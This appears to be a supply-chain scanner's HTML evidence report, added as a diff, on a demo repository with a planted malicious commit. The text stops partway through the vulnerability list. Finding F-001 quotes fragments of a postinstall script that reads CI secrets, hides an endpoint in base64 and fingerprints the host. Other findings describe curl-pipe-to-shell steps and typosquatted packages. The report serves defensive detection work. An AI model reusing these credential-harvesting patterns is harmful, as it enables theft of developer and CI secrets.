@@ -1,0 +1,1169 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="sscg report_export">
+<title>Guardian evidence report: sscg-demo-target</title>
+<style>
+:root{--bg:#fcfcfb;--fg:#1b1b19;--muted:#5f5e58;--line:#dedcd4;--head:#f1f0ec;--zebra:#f7f6f3;
+--code:#f1f0ec;--link:#1f5fbf;--accent:#2a78d6}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#161615;--fg:#ecebe6;--muted:#a3a19a;
+--line:#3a3935;--head:#22221f;--zebra:#1c1c1a;--code:#2a2a27;--link:#7fb0f5;--accent:#6aa6ef}}
+:root[data-theme="dark"]{--bg:#161615;--fg:#ecebe6;--muted:#a3a19a;--line:#3a3935;--head:#22221f;--zebra:#1c1c1a;
+--code:#2a2a27;--link:#7fb0f5;--accent:#6aa6ef}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);
+font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif}
+main{max-width:1180px;margin:0 auto;padding:32px 16px 64px}
+h1{font-size:1.9rem;line-height:1.2;margin:0 0 .4rem}
+h2{font-size:1.35rem;margin:2.2rem 0 .8rem;padding-bottom:.3rem;border-bottom:2px solid var(--accent)}
+h3{font-size:1.05rem;margin:1.8rem 0 .5rem}
+p,li{max-width:110ch}
+em{color:var(--muted)}
+a{color:var(--link);overflow-wrap:anywhere}
+code{font:.86em/1.4 ui-monospace,SFMono-Regular,Consolas,"DejaVu Sans Mono",monospace;background:var(--code);
+padding:.1em .35em;border-radius:4px;overflow-wrap:anywhere}
+pre{background:var(--code);padding:12px;border-radius:6px;overflow-x:auto}
+pre code{padding:0;background:none}
+table{display:block;overflow-x:auto;border-collapse:collapse;margin:.8rem 0 1.2rem;font-size:13px;max-width:100%}
+th,td{border:1px solid var(--line);padding:5px 8px;text-align:left;vertical-align:top}
+th{background:var(--head);font-weight:600}
+tbody tr:nth-child(even){background:var(--zebra)}
+ul{padding-left:1.4rem}
+li{margin:.15rem 0}
+footer{margin-top:3rem;color:var(--muted);font-size:12px}
+@media print{:root{--bg:#fff;--fg:#000;--zebra:#f6f6f6}main{max-width:none;padding:0}
+table{display:table;font-size:10px}h2,h3{break-after:avoid}tr{break-inside:avoid}a{color:inherit}}
+</style>
+</head>
+<body>
+<main>
+<h1>Guardian evidence report: sscg-demo-target</h1>
+<p><em>Scanned 2026-11-23T12:37:18+00:00 with sscg 0.1.0</em> · HEAD <code>8cad42e</code></p>
+<p><strong>Repository → SBOM → Dependency graph → Risk detection → Evidence</strong> ✔</p>
+<h2>1. What is in the application</h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Components</td>
+<td>31 (github-actions 3, url 2, docker 1, maven 8, npm 7, pypi 10)</td>
+</tr>
+<tr>
+<td>Libraries</td>
+<td>25: 13 direct, 12 transitive, max depth 2</td>
+</tr>
+<tr>
+<td>Container images</td>
+<td>1: fastbuilds42/node:latest</td>
+</tr>
+<tr>
+<td>CI/CD</td>
+<td>1 workflow(s), 3 distinct actions</td>
+</tr>
+<tr>
+<td>SBOM</td>
+<td><code>sbom.cdx.json</code> (CycloneDX 1.5, 36 components)</td>
+</tr>
+</tbody>
+</table>
+<h2>2. What changed</h2>
+<p>Base <code>bf0e651</code> (feat: initial acme-orders service) → HEAD <code>8cad42e</code> (chore: routine dependency refresh)</p>
+<ul>
+<li>Author of HEAD: fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, first-time contributor: <strong>yes</strong></li>
+<li>Files changed: M <code>.github/workflows/ci.yml</code>, M <code>Dockerfile</code>, M <code>package-lock.json</code>, M <code>package.json</code>, A <code>scripts/setup.js</code>, M <code>worker/requirements.txt</code></li>
+<li>Components added: <code>fastbuilds42/node:latest</code>, <code>fastbuilds42/cache-helper@main</code>, <code>crossenv@7.0.3</code>, <code>python3-dateutil@2.8.1</code>, <code>get.example.invalid/bootstrap.sh</code>, <code>get.example.invalid/ci-agent.sh</code>, <code>urllib3@2.8.0</code></li>
+<li>Components removed: <code>node:18-alpine</code></li>
+<li>Components changed: <code>lodash@4.17.15</code> → <code>lodash@4.17.15</code> (resolved, integrity)</li>
+<li><strong>New findings introduced by this change: 25</strong></li>
+</ul>
+<h2>3. What appears risky</h2>
+<p><strong>41 findings</strong>: 16 vulnerable components (141 advisories) and 25 supply-chain anomalies.</p>
+<table>
+<thead>
+<tr>
+<th>Level</th>
+<th>Critical</th>
+<th>High</th>
+<th>Medium</th>
+<th>Low</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Findings</td>
+<td>21</td>
+<td>8</td>
+<td>12</td>
+<td>0</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p><em>Initial risk = Guardian initial risk (heuristic, 0-10); not a CVSS score. Official severity is shown separately for vulnerabilities.</em></p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Risk</th>
+<th>Type</th>
+<th>Finding</th>
+<th>Location</th>
+<th>New</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F-001</td>
+<td>🟥 Critical (10.0)</td>
+<td>Unsafe install script</td>
+<td>'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user</td>
+<td><code>scripts/setup.js:3</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-002</td>
+<td>🟥 Critical (10.0)</td>
+<td>Unsafe CI/CD component</td>
+<td>.github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code</td>
+<td><code>.github/workflows/ci.yml:16</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-003</td>
+<td>🟥 Critical (10.0)</td>
+<td>Unsafe CI/CD component</td>
+<td>.github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script</td>
+<td><code>.github/workflows/ci.yml:24</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-004</td>
+<td>🟥 Critical (10.0)</td>
+<td>Typosquatted package</td>
+<td>crossenv@7.0.3 is a documented malicious package</td>
+<td><code>package.json:18</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-005</td>
+<td>🟥 Critical (10.0)</td>
+<td>Modified lockfile</td>
+<td>lodash@4.17.15: same version, different content hash (and source) in package-lock.json</td>
+<td><code>package-lock.json:51</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-006</td>
+<td>🟥 Critical (10.0)</td>
+<td>Typosquatted package</td>
+<td>python3-dateutil@2.8.1 is a documented malicious package</td>
+<td><code>worker/requirements.txt:4</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-007</td>
+<td>🟥 Critical (10.0)</td>
+<td>Vulnerable direct dependency</td>
+<td>org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-008</td>
+<td>🟥 Critical (9.8)</td>
+<td>Vulnerable direct dependency</td>
+<td>com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-009</td>
+<td>🟥 Critical (9.8)</td>
+<td>Vulnerable transitive dependency</td>
+<td>minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)</td>
+<td><code>package-lock.json</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-010</td>
+<td>🟥 Critical (9.8)</td>
+<td>Vulnerable direct dependency</td>
+<td>org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-011</td>
+<td>🟥 Critical (9.8)</td>
+<td>Vulnerable direct dependency</td>
+<td>pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)</td>
+<td><code>worker/requirements.txt:2</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-012</td>
+<td>🟥 Critical (9.0)</td>
+<td>Typosquatted package</td>
+<td>'crossenv' looks like the popular package 'cross-env'</td>
+<td><code>package.json:18</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-013</td>
+<td>🟥 Critical (9.0)</td>
+<td>Typosquatted package</td>
+<td>'python3-dateutil' looks like the popular package 'python-dateutil'</td>
+<td><code>worker/requirements.txt:4</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-014</td>
+<td>🟥 Critical (9.0)</td>
+<td>Unsafe install script</td>
+<td>.github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell</td>
+<td><code>.github/workflows/ci.yml:22</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-015</td>
+<td>🟥 Critical (9.0)</td>
+<td>Unsafe CI/CD component</td>
+<td>.github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA</td>
+<td><code>.github/workflows/ci.yml:20</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-016</td>
+<td>🟥 Critical (9.0)</td>
+<td>Unsafe CI/CD component</td>
+<td>.github/workflows/ci.yml: workflow token has 'permissions: write-all'</td>
+<td><code>.github/workflows/ci.yml:8</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-017</td>
+<td>🟥 Critical (9.0)</td>
+<td>Unsafe install script</td>
+<td>Dockerfile downloads a script and pipes it into a shell</td>
+<td><code>Dockerfile:4</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-018</td>
+<td>🟥 Critical (9.0)</td>
+<td>Suspicious package update</td>
+<td>first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e (&quot;chore: routine dependency refresh&quot;)</td>
+<td><code>commit 8cad42e</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-019</td>
+<td>🟥 Critical (9.0)</td>
+<td>Untrusted image</td>
+<td>image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node)</td>
+<td><code>Dockerfile:1</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-020</td>
+<td>🟥 Critical (9.0)</td>
+<td>Modified lockfile</td>
+<td>lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry</td>
+<td><code>package-lock.json:50</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-021</td>
+<td>🟥 Critical (9.0)</td>
+<td>Modified lockfile</td>
+<td>lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15'</td>
+<td><code>package-lock.json:51</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-022</td>
+<td>🟧 High (8.8)</td>
+<td>Vulnerable direct dependency</td>
+<td>node-fetch@2.6.0: 2 known vulnerabilities (highest HIGH, CVSS 8.8)</td>
+<td><code>package-lock.json</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-023</td>
+<td>🟧 High (8.6)</td>
+<td>Vulnerable direct dependency</td>
+<td>axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)</td>
+<td><code>package-lock.json</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-024</td>
+<td>🟧 High (8.6)</td>
+<td>Vulnerable direct dependency</td>
+<td>jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)</td>
+<td><code>worker/requirements.txt:3</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-025</td>
+<td>🟧 High (8.1)</td>
+<td>Vulnerable direct dependency</td>
+<td>lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)</td>
+<td><code>package-lock.json</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-026</td>
+<td>🟧 High (8.0)</td>
+<td>Vulnerable transitive dependency</td>
+<td>follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)</td>
+<td><code>package-lock.json</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-027</td>
+<td>🟧 High (7.5)</td>
+<td>Vulnerable transitive dependency</td>
+<td>com.fasterxml.jackson.core:jackson-core@2.9.8: 4 known vulnerabilities (highest HIGH, CVSS 7.5)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-028</td>
+<td>🟧 High (7.5)</td>
+<td>Vulnerable direct dependency</td>
+<td>requests@2.19.1: 5 known vulnerabilities (highest HIGH, CVSS 7.5)</td>
+<td><code>worker/requirements.txt:1</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-029</td>
+<td>🟧 High (7.5)</td>
+<td>Vulnerable transitive dependency</td>
+<td>urllib3@1.23.0: 12 known vulnerabilities (highest HIGH, CVSS 7.5)</td>
+<td><code>worker/requirements.txt:1</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-030</td>
+<td>🟨 Medium (6.5)</td>
+<td>Untrusted image</td>
+<td>Dockerfile runs 'npm install' with install scripts enabled</td>
+<td><code>Dockerfile:5</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-031</td>
+<td>🟨 Medium (6.5)</td>
+<td>Unsafe install script</td>
+<td>acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js</td>
+<td><code>package.json:8</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-032</td>
+<td>🟨 Medium (6.5)</td>
+<td>Untrusted image</td>
+<td>image fastbuilds42/node:latest uses a mutable tag and no digest</td>
+<td><code>Dockerfile:1</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-033</td>
+<td>🟨 Medium (6.5)</td>
+<td>Unexpected dependency</td>
+<td>new dev dependency crossenv@7.0.3 added in package.json</td>
+<td><code>package.json:18</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-034</td>
+<td>🟨 Medium (6.5)</td>
+<td>Unexpected dependency</td>
+<td>new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt</td>
+<td><code>worker/requirements.txt:4</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-035</td>
+<td>🟨 Medium (6.5)</td>
+<td>Unexpected dependency</td>
+<td>new prod dependency urllib3@2.8.0 added in worker/requirements.txt</td>
+<td><code>worker/requirements.txt:5</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-036</td>
+<td>🟨 Medium (6.5)</td>
+<td>Vulnerable transitive dependency</td>
+<td>org.apache.commons:commons-lang3@3.11: 1 known vulnerability (highest MEDIUM, CVSS 6.5)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-037</td>
+<td>🟨 Medium (6.2)</td>
+<td>Vulnerable transitive dependency</td>
+<td>idna@2.7.0: 2 known vulnerabilities (highest MEDIUM, CVSS 6.2)</td>
+<td><code>worker/requirements.txt:1</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-038</td>
+<td>🟨 Medium (5.5)</td>
+<td>Vulnerable transitive dependency</td>
+<td>org.apache.logging.log4j:log4j-api@2.14.1: 1 known vulnerability (highest MEDIUM)</td>
+<td><code>notifier/pom.xml</code></td>
+<td></td>
+</tr>
+<tr>
+<td>F-039</td>
+<td>🟨 Medium (4.0)</td>
+<td>Suspicious package update</td>
+<td>'urllib3' has no exact version in worker/requirements.txt (any version)</td>
+<td><code>worker/requirements.txt:5</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-040</td>
+<td>🟨 Medium (4.0)</td>
+<td>Untrusted image</td>
+<td>Dockerfile sets no USER: the container runs as the base image's default user (usually root)</td>
+<td><code>Dockerfile</code></td>
+<td>🆕</td>
+</tr>
+<tr>
+<td>F-041</td>
+<td>🟨 Medium (4.0)</td>
+<td>Unsafe install script</td>
+<td>crossenv@7.0.3 runs an install script (code not inspected)</td>
+<td><code>package-lock.json</code></td>
+<td>🆕</td>
+</tr>
+</tbody>
+</table>
+<h2>4. Evidence per finding</h2>
+<h3>F-001 · 🟥 Critical (10.0) · Unsafe install script · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> 'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user</li>
+<li><strong>Where:</strong> <code>scripts/setup.js:3</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>scripts/setup.js:3</code>: <code>const cp = require('child_process');</code> (runs shell commands / child processes)</li>
+<li><code>scripts/setup.js:7</code>: <code>const KEYS = ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY'];</code> (reads secrets from the environment)</li>
+<li><code>scripts/setup.js:6</code>: <code>const ENDPOINT = Buffer.from('aHR0cDovL3RlbGVtZXRyeS5leGFtcGxlLmludmFsaWQvYw==', 'base64').toString();</code> (hides data with base64)</li>
+<li><code>scripts/setup.js:10</code>: <code>return { host: os.hostname(), user: os.userInfo().username, keys: KEYS.filter((k) =&gt; k in process.env) };</code> (fingerprints the host / user)</li>
+<li>base64 string in scripts/setup.js decodes to: http://telemetry.example.invalid/c</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R04_INSTALL_SCRIPT_CONTENT default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The install script contains behaviour typical of credential theft or droppers.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-002 · 🟥 Critical (10.0) · Unsafe CI/CD component · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> .github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code</li>
+<li><strong>Where:</strong> <code>.github/workflows/ci.yml:16</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>.github/workflows/ci.yml:16</code>: <code>ref: ${{ github.event.pull_request.head.sha }}</code></li>
+<li>triggers: pull_request_target, push</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R14_CI_PWN_REQUEST default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> pull_request_target runs with repository secrets; checking out the PR's code runs untrusted code with them.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-003 · 🟥 Critical (10.0) · Unsafe CI/CD component · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> .github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script</li>
+<li><strong>Where:</strong> <code>.github/workflows/ci.yml:24</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>.github/workflows/ci.yml:24</code>: <code>NPM_TOKEN: ${{ secrets.NPM_TOKEN }}</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R17_CI_SECRET_EXPOSURE default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A secret is handed to code that was downloaded at run time or comes from a mutable third-party action.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-004 · 🟥 Critical (10.0) · Typosquatted package · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> crossenv@7.0.3 is a documented malicious package</li>
+<li><strong>Component:</strong> <code>crossenv@7.0.3</code> (npm, scope dev, direct), purl <code>pkg:npm/crossenv@7.0.3</code></li>
+<li><strong>Where:</strong> <code>package.json:18</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → crossenv@7.0.3</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>known_malicious.json: npm typosquatting campaign, Aug 2017: credential-stealing packages published by user 'hacktask', removed by npm (impersonates 'cross-env')</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R02_KNOWN_MALICIOUS default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> This package (version) is publicly documented as malicious.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-005 · 🟥 Critical (10.0) · Modified lockfile · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> lodash@4.17.15: same version, different content hash (and source) in package-lock.json</li>
+<li><strong>Component:</strong> <code>lodash@4.17.15</code> (npm, scope prod, direct), purl <code>pkg:npm/lodash@4.17.15</code></li>
+<li><strong>Where:</strong> <code>package-lock.json:51</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → lodash@4.17.15</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>lockfile change in <code>package-lock.json</code>: resolved: <code>https://registry.npmjs.org/lodash/-/lodash-4.17.15.tgz</code> → <code>https://npm-mirror.example.invalid/lodash/-/lodash-4.17.15.tgz</code>; integrity: <code>sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmbKmRS6J3VQppPOIt0MnmE+4xlZoumy0GPG0D0MVIQbNA1A==</code> → <code>sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==</code></li>
+<li><code>package-lock.json:51</code>: <code>&quot;integrity&quot;: &quot;sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg==&quot;</code></li>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R06_LOCKFILE_INTEGRITY_CHANGED default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> Same name and version but a different content hash: the package tarball was swapped.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-006 · 🟥 Critical (10.0) · Typosquatted package · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> python3-dateutil@2.8.1 is a documented malicious package</li>
+<li><strong>Component:</strong> <code>python3-dateutil@2.8.1</code> (pypi, scope prod, direct), purl <code>pkg:pypi/python3-dateutil@2.8.1</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:4</code></li>
+<li><strong>Dependency path:</strong> worker → python3-dateutil@2.8.1</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>known_malicious.json: PyPI typosquat, Dec 2019: imported jeIlyfish, which stole SSH/GPG keys (impersonates 'python-dateutil')</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): R02_KNOWN_MALICIOUS default level Critical; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> This package (version) is publicly documented as malicious.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-007 · 🟥 Critical (10.0) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0)</li>
+<li><strong>Component:</strong> <code>org.apache.logging.log4j:log4j-core@2.14.1</code> (maven, scope prod, direct), purl <code>pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → org.apache.logging.log4j:log4j-core@2.14.1</li>
+<li><strong>Official severity:</strong> CRITICAL, CVSS 10.0 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.25.4</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-jfh8-c2jp-5v3q">GHSA-jfh8-c2jp-5v3q</a> (CVE-2021-44228): CRITICAL, CVSS 10.0, fixed in 2.15.0. Remote code injection in Log4j</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-7rjr-3q55-vv33">GHSA-7rjr-3q55-vv33</a> (CVE-2021-45046): CRITICAL, CVSS 9.0, fixed in 2.16.0. Incomplete fix for Apache Log4j vulnerability</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-p6xc-xr62-6r2g">GHSA-p6xc-xr62-6r2g</a> (CVE-2021-45105): HIGH, CVSS 8.6, fixed in 2.17.0. Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-8489-44mv-ggj8">GHSA-8489-44mv-ggj8</a> (CVE-2021-44832): MEDIUM, CVSS 6.6, fixed in 2.17.1. Improper Input Validation and Injection in Apache Log4j2</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-3pxv-7cmr-fjr4">GHSA-3pxv-7cmr-fjr4</a> (CVE-2026-34480): MEDIUM, fixed in 2.25.4. Apache Log4j Core: Silent log event loss in XmlLayout due to unescaped XML 1.0 forbidden characters</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-6hg6-v5c8-fphq">GHSA-6hg6-v5c8-fphq</a> (CVE-2026-34477): MEDIUM, fixed in 2.25.4. Apache Log4j Core: <code>verifyHostName</code> attribute silently ignored in TLS configuration</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-h383-gmxw-35v2">GHSA-h383-gmxw-35v2</a> (CVE-2026-34479): MEDIUM, fixed in 2.25.4. Apache Log4j 1 to Log4j 2 bridge: silent log event loss in Log4j1XmlLayout due to unescaped XML 1.0 forbidden characters</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-vc5p-v9hr-52mj">GHSA-vc5p-v9hr-52mj</a> (CVE-2025-68161): MEDIUM, fixed in 2.25.3. Apache Log4j does not verify the TLS hostname in its Socket Appender</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Critical (10.0): highest advisory severity CRITICAL (CVSS 10.0)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-008 · 🟥 Critical (9.8) · Vulnerable direct dependency</h3>
+<ul>
+<li><strong>What:</strong> com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8)</li>
+<li><strong>Component:</strong> <code>com.fasterxml.jackson.core:jackson-databind@2.9.8</code> (maven, scope prod, direct), purl <code>pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.9.8</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → com.fasterxml.jackson.core:jackson-databind@2.9.8</li>
+<li><strong>Official severity:</strong> CRITICAL, CVSS 9.8 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.18.11</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-4w82-r329-3q67">GHSA-4w82-r329-3q67</a> (CVE-2020-8840): CRITICAL, CVSS 9.8, fixed in 2.9.10.3. Deserialization of Untrusted Data in jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-5p34-5m6p-p58g">GHSA-5p34-5m6p-p58g</a> (CVE-2020-9546): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-6fpp-rgj9-8rwc">GHSA-6fpp-rgj9-8rwc</a> (CVE-2019-14379): CRITICAL, CVSS 9.8, fixed in 2.9.9.2. Deserialization of untrusted data in FasterXML jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-85cw-hj65-qqv9">GHSA-85cw-hj65-qqv9</a> (CVE-2019-16335): CRITICAL, CVSS 9.8, fixed in 2.9.10. Polymorphic Typing issue in FasterXML jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-f3j5-rmmp-3fc5">GHSA-f3j5-rmmp-3fc5</a> (CVE-2019-17267): CRITICAL, CVSS 9.8, fixed in 2.9.10. Improper Input Validation in jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-fmmc-742q-jg75">GHSA-fmmc-742q-jg75</a> (CVE-2019-16943): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. jackson-databind polymorphic typing issue</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-gjmw-vf9h-g25v">GHSA-gjmw-vf9h-g25v</a> (CVE-2019-17531): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. jackson-databind polymorphic typing issue</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-gww7-p5w4-wrfv">GHSA-gww7-p5w4-wrfv</a> (CVE-2019-20330): CRITICAL, CVSS 9.8, fixed in 2.9.10.2. Deserialization of Untrusted Data in jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-h822-r4r5-v8jg">GHSA-h822-r4r5-v8jg</a> (CVE-2019-14540): CRITICAL, CVSS 9.8, fixed in 2.9.10. Polymorphic Typing issue in FasterXML jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-mx7p-6679-8g3q">GHSA-mx7p-6679-8g3q</a> (CVE-2019-16942): CRITICAL, CVSS 9.8, fixed in 2.9.10.1. Polymorphic Typing in FasterXML jackson-databind</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-p43x-xfjf-5jhr">GHSA-p43x-xfjf-5jhr</a> (CVE-2020-9548): CRITICAL, CVSS 9.8, fixed in 2.9.10.4. jackson-databind mishandles the interaction between serialization gadgets and typing</li>
